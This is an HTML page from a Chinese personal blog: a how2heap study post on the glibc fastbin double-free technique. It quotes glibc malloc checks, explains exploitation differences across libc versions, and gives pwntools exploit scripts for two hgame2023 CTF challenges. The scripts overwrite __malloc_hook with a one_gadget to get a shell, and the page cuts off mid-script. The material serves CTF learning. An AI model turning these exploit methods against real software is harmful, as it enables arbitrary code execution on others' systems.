@@ -1,0 +1,705 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异。冲！(｡･∀･)ﾉﾞ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin dup">
+<meta property="og:url" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异。冲！(｡･∀･)ﾉﾞ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc9.jpg">
+<meta property="article:published_time" content="2023-01-23T05:26:50.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:17:06.142Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="how2heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc9.jpg">
+  
+  
+  
+  <title>fastbin dup - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc9.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fastbin dup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-23 13:26" pubdate>
+          2023年1月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fastbin dup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异。冲！(｡･∀･)ﾉﾞ</p>
+<span id="more"></span>
+
+<h1 id="相关检查（所用源码版本2-23）"><a href="#相关检查（所用源码版本2-23）" class="headerlink" title="相关检查（所用源码版本2.23）"></a>相关检查（所用源码版本2.23）</h1><p>malloc中对从fastbin中取chunk的检查只有size的合法性检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">         <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>           &#123;<br><span class="hljs-comment">//chunksize和相应fastbin链的大小相符检测</span><br>             errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>           errout:<br>             malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>           &#125;<br></code></pre></td></tr></table></figure>
+<p>free中对于将chunk放进fastbin的检查有：</p>
+<ul>
+<li>开始对所有chunk的对齐和大小是否超界的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//筛掉一些特别大的chunk（超出内存边界）</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//对齐检查</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br></code></pre></td></tr></table></figure></li>
+<li>下一个chunk是不是top chunk<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">     */</span><br>     &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><br>     )<br></code></pre></td></tr></table></figure></li>
+<li>下一个chunk的大小是否超界的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>		     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>	  mutex_lock(&amp;av-&gt;mutex);<br>	  locked = <span class="hljs-number">1</span>;<br>	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li>
+<li>fastbin的第一个chunk是不是插入的chunk（double free检查）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li>
+<li>以及chunk的大小合法性检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h2><p>为了避开free中double free的检查（只检查第一个chunk是不是正在free的chunk），一般在double free中间再free另一个chunk形成a-&gt;b-&gt;a的形式再通过申请回第一个a来改变最后一个a的fd指针指向fake chunk<br>一般会将fd指针指向__malloc_hook-0x23，这个地址+8有一个0x7f，可以作为合法的size。这样我们可以在申请chunk的时候申请0x60大小的chunk来绕开chunk的size的合法性检查，将malloc_hook改为one_gadget的地址（free_hook前面全是0）</p>
+<img src="/2023/01/23/fastbin-dup/fake_chunk.png" srcset="/img/loading.gif" lazyload class title="fake chunk">
+
+<h2 id="2-27-2-31"><a href="#2-27-2-31" class="headerlink" title="2.27-2.31"></a>2.27-2.31</h2><p>2.26比之前最大的变化就是在fastbin之前增加了tcache，利用方法也发（bian）生（jian）了（dan）变（le）化（ne）    </p>
+<ul>
+<li>先申请7个chunk填满tcache</li>
+<li>再在fastbin中形成a-&gt;b-&gt;a</li>
+<li>再把tcache清空</li>
+<li>再申请一个chunk就可以申请到a，同时b和a（2）就会被放进tcache，这时tcache是这样的b-&gt;a（fastbin的chunk放进tcache是每次取最后一个chunk再执行tcache_put）</li>
+<li>由于tcache中没有size的检查，所以直接改free_hook就行（注意tcache中的指针指向的是chunk中的data）</li>
+</ul>
+<h2 id="2-32以上"><a href="#2-32以上" class="headerlink" title="2.32以上"></a>2.32以上</h2><p>增加了单链表的指针保护机制以及地址0x10对齐检查（错位找0x7f打fastbin不行了）</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hgame2023-week2-fast-note"><a href="#hgame2023-week2-fast-note" class="headerlink" title="hgame2023 week2 fast_note"></a>hgame2023 week2 fast_note</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>libc版本2.23<br>金典的菜单题，有UAF。思路就是先填满tcache利用unsorted bin泄露libc基址，再用fastbin double free将malloc_hook改为one_gadget<br>这道题麻烦的地方在于四个one_gadget都不可用 </p>
+<img src="/2023/01/23/fastbin-dup/one_gadget.png" srcset="/img/loading.gif" lazyload class title="one_gadget">
+<p>其中后三个one_gadget限定的是栈空间，那我们就可以通过realloc调节栈内容</p>
+<h3 id="realloc调节栈内容"><a href="#realloc调节栈内容" class="headerlink" title="realloc调节栈内容"></a>realloc调节栈内容</h3><p>realloc的执行流程和malloc一样也是先检查hook是否为null，如果不为null就调用hook<br>realloc函数开头有很多push指令，可以通过push指令抬高栈，push指令的数量可以通过偏移调整</p>
+<img src="/2023/01/23/fastbin-dup/realloc.png" srcset="/img/loading.gif" lazyload class title="realloc（libc-2.23.so）">
+<p>我们可以将malloc_hook填充为realloc+offset（offset可取0，2，4，6，12，13），offset越大，push指令越少，栈地址越高；再将realloc_hook填充为one_gadget。而realloc_hook的地址其实就在malloc_hook上方</p>
+<img src="/2023/01/23/fastbin-dup/realloc_hook.png" srcset="/img/loading.gif" lazyload class title="realloc_hook">
+<p>在改fd指针时可以一趟改掉</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./fast&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">31626</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>malloc_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>one_addr=libcbase+<span class="hljs-number">0xf1247</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">0x8</span>)+p64(one_addr)+p64(realloc_addr+<span class="hljs-number">6</span>))<br><span class="hljs-comment">#add(8,0x10,b&#x27;a&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">8</span>).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>).encode())<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>
+<h2 id="hgame2023-week2-new-fast-note"><a href="#hgame2023-week2-new-fast-note" class="headerlink" title="hgame2023 week2 new_fast_note"></a>hgame2023 week2 new_fast_note</h2><p>libc版本2.31</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>没啥难度，就是tcache版本的fastbin double free，不说了。就是注意这道题没有重复malloc的检查了（做的时候没看见QAQ）</p>
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./new&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30170</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br>show(<span class="hljs-number">7</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i)<br>delete(<span class="hljs-number">7</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>free_hook=libcbase+libc.symbols[<span 